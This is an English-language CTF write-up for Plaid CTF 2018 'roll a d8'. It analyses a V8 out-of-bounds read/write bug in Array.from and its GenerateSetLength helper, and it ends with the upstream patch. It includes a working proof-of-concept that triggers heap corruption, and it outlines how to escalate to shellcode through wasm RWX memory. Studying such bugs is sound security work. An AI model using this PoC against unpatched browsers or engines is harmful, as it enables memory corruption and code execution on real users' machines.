# Plaid CTF 2018 roll a d8

This challenge wants us to write an exploit of a N-day [Vulnerability](https://bugs.chromium.org/p/chromium/issues/detail?id=821137).

Now, We can analyze it from the **Issue 821137 "OOB read/write using Array.prototype.from"**, which 

points out the vulnerability existing in **v8/src/builtins/builtins-array-gen.cc:1945 —— GenerateSetLength**. Then I find that function **Array.from** call the vulnerability function 'GenerateSetLength'. 

**Array.from** is a builtin function of object **Array**. Its source code is written as CodeStubAssembler (CSA) format. In the article —— [Taming architecture complexity in V8 — the CodeStubAssembler](https://v8.dev/blog/csa) , we can learn the principle of CSA. In the article —— [CodeStubAssembler builtins](https://v8.dev/docs/csa-builtins), we can learn how to write a builtin function via CSA.

After learning what is CSA, we return to see the builtin function **Array.from**.

In [w3schools](https://www.w3schools.com/jsref/jsref_from.asp), we find the details of Array from() Method in javascript.

> ## Definition and Usage
>
> The Array.from() method returns an Array object from any object with a length property or an iterable object.
>
> ## Syntax
>
> Array.from(*object, mapFunction, thisValue*)
>
> ## Parameter Values
>
> | Parameter     | Description                                                  |
> | :------------ | :----------------------------------------------------------- |
> | *object*      | Required. The object to convert to an array                  |
> | *mapFunction* | Optional. A map function to call on each item of the array   |
> | *thisValue*   | Optional. A value to use as *this* when executing the *mapFunction* |

We can see that this function in JavaScript is used to build a new Array using a existed Array object and a mapfunction. For example, we can copy an Array object by using it.

```js
┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/rollad8/v8/out/x64.release/test] - [一 6月 03, 11:01]
└─[$] <git:(1dab065*)> cat test.js 
let a = [1.1,1.2];
let b = Array.from(a);
%DebugPrint(a);
%DebugPrint(b);
┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/rollad8/v8/out/x64.release/test] - [一 6月 03, 11:01]
└─[$] <git:(1dab065*)> ../d8 --allow-natives-syntax ./test.js 
0x13264ad0d531 <JSArray[2]>
0x13264ad0d581 <JSArray[2]>
```

Also, we can processing each member by using the second parameter —— **mapfunction**.

```js
┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/rollad8/v8/out/x64.release/test] - [一 6月 03, 11:17]
└─[$] <git:(1dab065*)> cat test.js                           
let a = [1.1,1.2];
let b = Array.from(a, (n) => n *2 );
console.log(a);
console.log(b);
┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/rollad8/v8/out/x64.release/test] - [一 6月 03, 11:17]
└─[$] <git:(1dab065*)> ../d8 --allow-natives-syntax ./test.js
1.1,1.2
2.2,2.4
```

Since we have known the function of **Array.from**， let's start to analyze its source code to think how it works.

The function is defined in `src\builtins/builtins-definitions.h line 246`

```c++
  /* ES6 #sec-array.from */                                                    \
  TFJ(ArrayFrom, SharedFunctionInfo::kDontAdaptArgumentsSentinel)   
```

Its real source code is in `src\builtins/builtins-array-gen.cc  line 1996` .

> in mark [1], it checks whether the second parameter is a function.
>
> in mark [2], it gets the iterator_method of the Array object, then check whether is null. if not , the Array object is **iterable**.
>
> if the Array object is iterable, in mark [3], it checks whether the iterator_method is callable.
>
> then in mark [4], using the Constructor to build a new Array, we will analyze it later.
>
> in mark [5], it is a loop.
>
> ​	in mark [6], it uses the iterator_method to get a value.
>
> ​	in mark [7], if there is the map_function, use the function to deal with the value .	
>
> ​	in mark [8], store the map_function result or original value into the new Array via `Runtime::kCreateDataProperty`, record the index++ .
>
> loop end.
>
> ignore not_iterable.
>
> last in mark [9], call `GenerateSetLength` to deal with the length of the new Array.
>
> return.

```c++
// ES #sec-array.from
TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) {
  TNode<Context> context = CAST(Parameter(BuiltinDescriptor::kContext));
  TNode<Int32T> argc =
      UncheckedCast<Int32T>(Parameter(BuiltinDescriptor::kArgumentsCount));pw

  CodeStubArguments args(this, ChangeInt32ToIntPtr(argc));

  TNode<Object> map_function = args.GetOptionalArgumentValue(1);

  // If map_function is not undefined, then ensure it's callable else throw.
[1]  {
    Label no_error(this), error(this);
    GotoIf(IsUndefined(map_function), &no_error);
    GotoIf(TaggedIsSmi(map_function), &error); 
    Branch(IsCallable(map_function), &no_error, &error);

    BIND(&error);
    ThrowTypeError(context, MessageTemplate::kCalledNonCallable, map_function);

    BIND(&no_error);
[/1]  }

  Label iterable(this), not_iterable(this), finished(this), if_exception(this);

  TNode<Object> this_arg = args.GetOptionalArgumentValue(2);
  TNode<Object> items = args.GetOptionalArgumentValue(0);
  // The spec doesn't require ToObject to be called directly on the iterable
  // branch, but it's part of GetMethod that is in the spec.
  TNode<JSReceiver> array_like = ToObject(context, items);

  TVARIABLE(Object, array);
  TVARIABLE(Number, length);

  // Determine whether items[Symbol.iterator] is defined:
  IteratorBuiltinsAssembler iterator_assembler(state());
[2]  Node* iterator_method =
      iterator_assembler.GetIteratorMethod(context, array_like);
[/2] Branch(IsNullOrUndefined(iterator_method), &not_iterable, &iterable);

  BIND(&iterable);
  {
    TVARIABLE(Number, index, SmiConstant(0));
    TVARIABLE(Object, var_exception);
    Label loop(this, &index), loop_done(this),
        on_exception(this, Label::kDeferred),
        index_overflow(this, Label::kDeferred);

    // Check that the method is callable.
[3]    {
      Label get_method_not_callable(this, Label::kDeferred), next(this);
      GotoIf(TaggedIsSmi(iterator_method), &get_method_not_callable);
      GotoIfNot(IsCallable(iterator_method), &get_method_not_callable);
      Goto(&next);

      BIND(&get_method_not_callable);
      ThrowTypeError(context, MessageTemplate::kCalledNonCallable,
                     iterator_method);

      BIND(&next);
[/3]   }

    // Construct the output array with empty length.
[4]    array = ConstructArrayLike(context, args.GetReceiver());
[/4]
    // Actually get the iterator and throw if the iterator method does not yield
    // one.
    IteratorRecord iterator_record =
        iterator_assembler.GetIterator(context, items, iterator_method);

    TNode<Context> native_context = LoadNativeContext(context);
    TNode<Object> fast_iterator_result_map =
        LoadContextElement(native_context, Context::ITERATOR_RESULT_MAP_INDEX);

    Goto(&loop);

[5]    BIND(&loop);
    {
      // Loop while iterator is not done.
   [6]   TNode<Object> next = CAST(iterator_assembler.IteratorStep(
          context, iterator_record, &loop_done, fast_iterator_result_map));
   [/6]   TVARIABLE(Object, value,
                CAST(iterator_assembler.IteratorValue(
                    context, next, fast_iterator_result_map)));

      // If a map_function is supplied then call it (using this_arg as
      // receiver), on the value returned from the iterator. Exceptions are
      // caught so the iterator can be closed.
   [7]   {
        Label next(this);
        GotoIf(IsUndefined(map_function), &next);

        CSA_ASSERT(this, IsCallable(map_function));
        Node* v = CallJS(CodeFactory::Call(isolate()), context, map_function,
                         this_arg, value.value(), index.value());
        GotoIfException(v, &on_exception, &var_exception);
        value = CAST(v);
        Goto(&next);
        BIND(&next);
   [/7]   }

      // Store the result in the output object (catching any exceptions so the
      // iterator can be closed).
  [8]    Node* define_status =
          CallRuntime(Runtime::kCreateDataProperty, context, array.value(),
                      index.value(), value.value());
      GotoIfException(define_status, &on_exception, &var_exception);

  [/8]    index = NumberInc(index.value());

      // The spec requires that we throw an exception if index reaches 2^53-1,
      // but an empty loop would take >100 days to do this many iterations. To
      // actually run for that long would require an iterator that never set
      // done to true and a target array which somehow never ran out of memory,
      // e.g. a proxy that discarded the values. Ignoring this case just means
      // we would repeatedly call CreateDataProperty with index = 2^53.
      CSA_ASSERT_BRANCH(this, [&](Label* ok, Label* not_ok) {
        BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),
                                           NumberConstant(kMaxSafeInteger), ok,
                                           not_ok);
      });
      Goto(&loop);
    }

    BIND(&loop_done);
    {
      length = index;
      Goto(&finished);
    }

    BIND(&on_exception);
    {
      // Close the iterator, rethrowing either the passed exception or
      // exceptions thrown during the close.
      iterator_assembler.IteratorCloseOnException(context, iterator_record,
                                                  &var_exception);
    }
 [/5] }

  // Since there's no iterator, items cannot be a Fast JS Array.
  BIND(&not_iterable);
  {
    CSA_ASSERT(this, Word32BinaryNot(IsFastJSArray(array_like, context)));

    // Treat array_like as an array and try to get its length.
    length = ToLength_Inline(
        context, GetProperty(context, array_like, factory()->length_string()));

    // Construct an array using the receiver as constructor with the same length
    // as the input array.
    array = ConstructArrayLike(context, args.GetReceiver(), length.value());

    TVARIABLE(Number, index, SmiConstant(0));

    GotoIf(SmiEqual(length.value(), SmiConstant(0)), &finished);

    // Loop from 0 to length-1.
    {
      Label loop(this, &index);
      Goto(&loop);
      BIND(&loop);
      TVARIABLE(Object, value);

      value = GetProperty(context, array_like, index.value());

      // If a map_function is supplied then call it (using this_arg as
      // receiver), on the value retrieved from the array.
      {
        Label next(this);
        GotoIf(IsUndefined(map_function), &next);

        CSA_ASSERT(this, IsCallable(map_function));
        value = CAST(CallJS(CodeFactory::Call(isolate()), context, map_function,
                            this_arg, value.value(), index.value()));
        Goto(&next);
        BIND(&next);
      }

      // Store the result in the output object.
      CallRuntime(Runtime::kCreateDataProperty, context, array.value(),
                  index.value(), value.value());
      index = NumberInc(index.value());
      BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),
                                         length.value(), &loop, &finished);
    }
  }

  BIND(&finished);

  // Finally set the length on the output and return it.
[9]  GenerateSetLength(context, array.value(), length.value());
[/9]  args.PopAndReturn(array.value());
}
```

Then we analyze `ConstructArrayLike`, in `src\builtins/builtins-array-gen.cc  line 1853`, we can find that `ConstructArrayLike` uses receiver to call its Construct(). while the function cannot break, so I put some `Print` into it ,and rebuild it to see what is `receiver`. The result is that  `receiver` is same as `this` pointer in JavaScript code.

```c++
  TNode<Object> ConstructArrayLike(TNode<Context> context,
                                   TNode<Object> receiver) {
    TVARIABLE(Object, array);
    Label is_constructor(this), is_not_constructor(this), done(this);
    GotoIf(TaggedIsSmi(receiver), &is_not_constructor);
    Branch(IsConstructor(receiver), &is_constructor, &is_not_constructor);

    BIND(&is_constructor);
    {
      array = CAST(
          ConstructJS(CodeFactory::Construct(isolate()), context, receiver));
      Goto(&done);
    }

    BIND(&is_not_constructor);
    {
      Label allocate_js_array(this);

      TNode<Map> array_map = CAST(LoadContextElement(
          context, Context::JS_ARRAY_PACKED_SMI_ELEMENTS_MAP_INDEX));

      array = CAST(AllocateJSArray(PACKED_SMI_ELEMENTS, array_map,
                                   SmiConstant(0), SmiConstant(0), nullptr,
                                   ParameterMode::SMI_PARAMETERS));
      Goto(&done);
    }
    BIND(&done);
    return array.value();
  }
```

last , we analyze the function `GenerateSetLength` where the vulnerability exists.

The function flow is:

> if the array has fast elements
>
>​      -> if the length is writable
>
>​           -> the new length is greater than the old length (index motioned before) 
>
>​				True -> goto  optimization
>
>​				False -> set length as old_length directly.		

```c++
  void GenerateSetLength(TNode<Context> context, TNode<Object> array,
                         TNode<Number> length) {
    Label fast(this), runtime(this), done(this);
    // Only set the length in this stub if
    // 1) the array has fast elements,
    // 2) the length is writable,
    // 3) the new length is greater than or equal to the old length.

    // 1) Check that the array has fast elements.
    // TODO(delphick): Consider changing this since it does an an unnecessary
    // check for SMIs.
    // TODO(delphick): Also we could hoist this to after the array construction
    // and copy the args into array in the same way as the Array constructor.
    BranchIfFastJSArray(array, context, &fast, &runtime);

    BIND(&fast);
    {
      TNode<JSArray> fast_array = CAST(array);

      TNode<Smi> length_smi = CAST(length);
      TNode<Smi> old_length = LoadFastJSArrayLength(fast_array);
      CSA_ASSERT(this, TaggedIsPositiveSmi(old_length));

      // 2) Ensure that the length is writable.
      // TODO(delphick): This check may be redundant due to the
      // BranchIfFastJSArray above.
      EnsureArrayLengthWritable(LoadMap(fast_array), &runtime);

      // 3) If the created array already has a length greater than required,
      //    then use the runtime to set the property as that will insert holes
      //    into the excess elements and/or shrink the backing store.
      GotoIf(SmiLessThan(length_smi, old_length), &runtime);

      StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,
                                     length_smi);

      Goto(&done);
    }

    BIND(&runtime);
    {
      CallRuntime(Runtime::kSetProperty, context, static_cast<Node*>(array),
                  CodeStubAssembler::LengthStringConstant(), length,
                  SmiConstant(LanguageMode::kStrict));
      Goto(&done);
    }

    BIND(&done);
  }
};
```

Now found that the `GenerateSetLength` ignores one case what if old length is greater than new length. if this case occur, the new Array's length will greater ,causing Out-Of-Bound read&write.

Ps. `Array.from` can be readable via JavaScript using [polyfill](https://github.com/inexorabletash/polyfill/blob/master/polyfill.js#L2146) .

Then come to the POC.

```js
let oobArray = [];
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
  {
    counter : 0,
    max : 1024 * 1024 * 8,
    next() {
      let result = this.counter++;
      if (this.counter == this.max) {
        oobArray.length = 0;
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) });
oobArray[oobArray.length - 1] = 0x41414141;
```

In POC, it uses `Array.from.call` to trigger the vulnerability. The Object.call() can change  `this` pointer as the first parameter, and it can change some Attributes via passing following parameter.

```js
┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/rollad8/v8/out/x64.release/test] - [一 6月 03, 12:49]
└─[$] <git:(1dab065*)> cat test.js 
function test(x){
	%DebugPrint(b);
	%DebugPrint(this);
}

let a = [123];
let b = function(){
	return a;
}

test.call(b);%                                                                  ┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/rollad8/v8/out/x64.release/test] - [一 6月 03, 12:49]
└─[$] <git:(1dab065*)> ../d8 --allow-natives-syntax ./test.js
0x19e71670d551 <JSFunction b (sfi = 0x20e455627039)>
0x19e71670d551 <JSFunction b (sfi = 0x20e455627039)>
```

when execute PoC , it will return the globe variable oobArray in `ConstructArrayLike`, the iterator_method will be set as below:

```js
(
  {
    counter : 0,
    max : 1024 * 1024 * 8,
    next() {
      let result = this.counter++;
      if (this.counter == this.max) {
        oobArray.length = 0;
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
)
```

we can see , when the loop execute 1024 * 1024 * 8 times, the oobArray length will be set 0, and its memory will be freed ,too. But, the index is still 1024 * 1024 * 8 , we the function `GenerateSetLength` is called, it will set oobArray length as 1024 * 1024 * 8 rudely. In this condition ,oobArray's real memory is 0, but its visitable limit is 1024 * 1024 * 8, then the vulnerability is triggered.

Since the PoC can cause OOB already, then exploit script is quite easy. Using the oob to make `addr_of`&`write_addr` primitive. using rwx memory created by wasm can execute shellcode finally.

**exp is [here](https://github.com/ret2p4nda/browser-pwn/blob/master/roll%20a%20d8/exp.js)**

![](./result.png)

Ps. during debuging, it is difficult to control heap memory accurately, I found that alloc global Object is more  stable than alloc it in function (like. exploit()).



At last, the patch of this vulnerability is easy , too.

```diff
@@ -1945,10 +1945,13 @@
   void GenerateSetLength(TNode<Context> context, TNode<Object> array,
                          TNode<Number> length) {
     Label fast(this), runtime(this), done(this);
+    // TODO(delphick): We should be able to skip the fast set altogether, if the
+    // length already equals the expected length, which it always is now on the
+    // fast path.
     // Only set the length in this stub if
     // 1) the array has fast elements,
     // 2) the length is writable,
-    // 3) the new length is greater than or equal to the old length.
+    // 3) the new length is equal to the old length.
 
     // 1) Check that the array has fast elements.
     // TODO(delphick): Consider changing this since it does an an unnecessary
@@ -1970,10 +1973,10 @@
       // BranchIfFastJSArray above.
       EnsureArrayLengthWritable(LoadMap(fast_array), &runtime);
 
-      // 3) If the created array already has a length greater than required,
+      // 3) If the created array's length does not match the required length,
       //    then use the runtime to set the property as that will insert holes
-      //    into the excess elements and/or shrink the backing store.
-      GotoIf(SmiLessThan(length_smi, old_length), &runtime);
+      //    into excess elements or shrink the backing store as appropriate.
+      GotoIf(SmiNotEqual(length_smi, old_length), &runtime);
 
       StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,
                                      length_smi);
```

It changes `SmiLessThan` into `SmiNotEqual`, which can cover the case mentioned before. 